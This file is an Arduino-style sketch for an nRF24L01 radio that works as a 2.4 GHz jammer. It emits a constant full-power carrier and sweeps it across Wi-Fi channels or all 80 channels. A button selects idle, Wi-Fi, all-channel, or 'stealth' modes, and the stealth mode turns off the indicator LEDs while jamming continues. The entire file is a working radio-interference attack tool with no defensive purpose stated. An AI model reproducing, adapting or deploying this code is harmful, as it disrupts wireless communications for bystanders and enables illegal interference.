#include "RF24.h"
#include <ezButton.h>

RF24 radio(2, 4);
byte i = 45;
ezButton button(3);
int red_led = 16;
int yellow_led = 5;
int green_led = 0;

const int wifiFrequencies[] = {
  2412,
  2417,
  2422,
  2427,
  2432,
  2437,
  2442,
  2447,
  2452,
  2457,
  2462
};

void setup() {
  Serial.begin(9600);
  button.setDebounceTime(100);
  pinMode(3, INPUT_PULLUP);
  pinMode(red_led, OUTPUT);
  pinMode(yellow_led, OUTPUT);
  pinMode(green_led, OUTPUT);
  delay(900);
  if (radio.begin()) {
    delay(200);
    radio.setAutoAck(false);
    radio.stopListening();
    radio.setRetries(0, 0);
    radio.setPayloadSize(5);
    radio.setAddressWidth(3);
    radio.setPALevel(RF24_PA_MAX);
    radio.setDataRate(RF24_2MBPS);
    radio.setCRCLength(RF24_CRC_DISABLED);
    radio.printPrettyDetails();
    radio.startConstCarrier(RF24_PA_MAX, i);
  } else {
    Serial.println("BLE Jammer couldn't be started!");
  }
}

void fullAttack() {
  for (size_t i = 0; i < 80; i++) {
    radio.setChannel(i);
  }
}
void wifiAttack() {
  for (int i = 0; i < sizeof(wifiFrequencies) / sizeof(wifiFrequencies[0]); i++) {
    radio.setChannel(wifiFrequencies[i] - 2400);
  }
}

const char* modes[] = {
  "idle",
  "wifi",
  "all",
  "stealth"
};

uint8_t attack_type = 0;
void loop() {
  button.loop();
  if (button.isPressed()) {
    attack_type = (attack_type + 1) % 4;
    Serial.println((String(modes[attack_type]) + " Mode").c_str());
  }
  switch (attack_type) {
    case 0:
      digitalWrite(red_led, LOW);
      digitalWrite(yellow_led, LOW);
      digitalWrite(green_led, HIGH);
      break;
    case 1:
      wifiAttack();
      digitalWrite(red_led, LOW);
      digitalWrite(yellow_led, HIGH);
      digitalWrite(green_led, LOW);
      break;
    case 2:
      fullAttack();
      digitalWrite(red_led, HIGH);
      digitalWrite(yellow_led, LOW);
      digitalWrite(green_led, LOW);
      break;
    case 3:
      fullAttack();
      digitalWrite(red_led, LOW);
      digitalWrite(yellow_led, LOW);
      digitalWrite(green_led, LOW);
  }
}